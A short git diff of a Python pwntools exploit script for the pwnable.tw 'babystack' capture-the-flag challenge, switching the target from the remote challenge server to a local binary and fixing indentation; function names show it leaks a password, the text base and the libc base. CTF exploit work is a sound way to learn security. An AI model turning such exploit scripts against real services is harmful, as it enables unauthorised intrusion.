@@ -1,7 +1,7 @@
 from pwn import *
 
-r = remote("chall.pwnable.tw", 10205)
-#r = process("./babystack")
+#r = remote("chall.pwnable.tw", 10205)
+r = process("./babystack")
 r.recvuntil(">> ")
 
 #gdb.attach(r)
@@ -71,7 +71,8 @@ def GetLibcBase(password):
 	return libc_base			
 
 def main():
-  print "This program takes more than 5 minutes"
+	print "This program takes more than 5 minutes"
+	
 	password = GetPassword()
 	print "password: " + password
 	base_text = GetTextBase(password)
